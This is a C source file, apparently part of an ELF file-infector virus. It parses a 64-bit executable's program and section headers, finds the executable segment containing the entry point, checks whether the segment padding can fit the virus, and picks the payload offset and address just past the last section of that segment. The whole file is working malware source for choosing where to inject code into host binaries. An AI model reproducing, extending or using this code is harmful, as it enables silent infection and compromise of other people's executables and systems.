#include "virus.h"
#include "utils.h"
#include "errors.h"
#include "compiler_utils.h"

#define is_exec_phdr(type, flags) (type == PT_LOAD && flags == (PF_R | PF_X))

struct data
{
	struct elf64_phdr	*safe_exec_phdr;
	struct elf64_shdr	*safe_entry_shdr;
	struct elf64_shdr	*safe_last_shdr;
	Elf64_Off		end_of_last_section;
	Elf64_Addr		e_entry;
};

static bool	find_entry_shdr(struct safe_ptr ref, const size_t offset,
			void *data)
{
	Elf64_Shdr	*sect_hdr = safe(ref, offset, sizeof(Elf64_Shdr));

	if (sect_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);

	struct data	*closure = data;

	if (!closure->safe_exec_phdr)
		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);

	const Elf64_Off		p_offset  = closure->safe_exec_phdr->p_offset;
	const Elf64_Xword	p_filesz  = closure->safe_exec_phdr->p_filesz;

	const Elf64_Addr	sh_addr   = sect_hdr->sh_addr;
	const Elf64_Off		sh_offset = sect_hdr->sh_offset;
	const uint64_t		sh_size   = sect_hdr->sh_size;

	const size_t		end_of_segment = p_offset + p_filesz;
	const size_t		end_of_section = sh_offset + sh_size;

	const Elf64_Addr	e_entry = closure->e_entry;
	const Elf64_Off		end_of_last_section = closure->end_of_last_section;

	if (sh_addr <= e_entry && e_entry < sh_addr + sh_size)
	{
		closure->safe_entry_shdr = sect_hdr;
	}
	if (end_of_last_section < end_of_section && end_of_section <= end_of_segment)
	{
		closure->safe_last_shdr = sect_hdr;
		closure->end_of_last_section = sh_offset;
	}
	return true;
}

static bool	find_entry_phdr(struct safe_ptr ref, const size_t offset,
			void *data)
{
	Elf64_Phdr	*seg_hdr = safe(ref, offset, sizeof(Elf64_Phdr));

	if (seg_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_BAD_PHDR_OFF);

	const uint32_t		p_type  = seg_hdr->p_type;
	const uint32_t		p_flags = seg_hdr->p_flags;
	const Elf64_Addr	p_vaddr = seg_hdr->p_vaddr;
	const Elf64_Xword	p_memsz = seg_hdr->p_memsz;

	struct data		*closure = data;
	const Elf64_Addr	e_entry  = closure->e_entry;

	if (is_exec_phdr(p_type, p_flags) && p_vaddr <= e_entry && e_entry < p_vaddr + p_memsz)
	{
		closure->safe_exec_phdr = seg_hdr;
	}
	return true;
}

static bool	has_enough_padding(struct elf64_phdr *safe_phdr,
			size_t full_virus_size)
{
	const uint64_t	p_memsz = safe_phdr->p_memsz;
	const uint64_t	p_align = safe_phdr->p_align;

	const size_t	shift_amount = ALIGN(full_virus_size, PAGE_ALIGNMENT);
	const size_t	padding_end  = (p_memsz % p_align) + shift_amount;

	return (padding_end <= p_align);
}

static bool	select_infection_method(struct entry *entry,
			struct data *closure, size_t full_virus_size)
{
	struct elf64_phdr	*safe_exec_phdr  = closure->safe_exec_phdr;
	struct elf64_shdr	*safe_entry_shdr = closure->safe_entry_shdr;
	struct elf64_shdr	*safe_last_shdr  = closure->safe_last_shdr;
	Elf64_Addr		e_entry          = closure->e_entry;

	if (!safe_entry_shdr || !safe_last_shdr || !safe_exec_phdr)
		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);

	const Elf64_Off		entry_sh_offset = safe_entry_shdr->sh_offset;
	const Elf64_Addr	entry_sh_addr = safe_entry_shdr->sh_addr;

	entry->entry_offset = entry_sh_offset + (e_entry - entry_sh_addr);
	entry->entry_addr   = entry_sh_addr   + (e_entry - entry_sh_addr);

	if (has_enough_padding(safe_exec_phdr, full_virus_size))
	{
		const Elf64_Off		sh_offset = safe_last_shdr->sh_offset;
		const uint64_t		sh_size   = safe_last_shdr->sh_size;
		const Elf64_Addr	sh_addr   = safe_last_shdr->sh_addr;

		entry->safe_phdr      = safe_exec_phdr;
		entry->safe_shdr      = safe_last_shdr;
		entry->payload_offset = sh_offset + sh_size;
		entry->payload_addr   = sh_addr + sh_size;
	}

	if (entry->safe_phdr   == NULL || entry->safe_shdr      == NULL
	|| entry->entry_offset == 0    || entry->payload_offset == 0
	|| entry->entry_addr   == 0    || entry->payload_addr   == 0)
		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);

	return true;
}

bool		find_entry(struct entry *entry, struct safe_ptr ref,
			size_t full_virus_size)
{
	struct data		closure;
	const Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));

	if (elf_hdr == NULL)
		return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	bzero(entry, sizeof(*entry));
	bzero(&closure, sizeof(closure));
	closure.e_entry = elf_hdr->e_entry;

	if (!foreach_phdr(ref, find_entry_phdr, &closure)
	|| !foreach_shdr(ref, find_entry_shdr, &closure)
	|| !select_infection_method(entry, &closure, full_virus_size))
		return errors(ERR_THROW, _ERR_T_FIND_ENTRY);

	return true;
}
